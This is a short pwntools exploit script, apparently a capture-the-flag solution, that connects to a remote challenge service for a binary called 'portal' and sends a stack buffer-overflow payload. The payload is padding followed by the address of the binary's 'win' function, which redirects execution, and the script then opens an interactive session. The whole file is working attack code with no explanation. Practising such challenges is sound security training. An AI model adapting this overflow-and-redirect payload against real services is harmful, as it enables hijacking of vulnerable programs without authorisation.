#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./portal',checksec=False)


#p = process()
p = remote('0.cloud.chals.io', 11723)

payload = b'a'*36 + p32(0)  + p32(0)+ p32(exe.sym.win)
p.sendline(payload)

p.interactive()
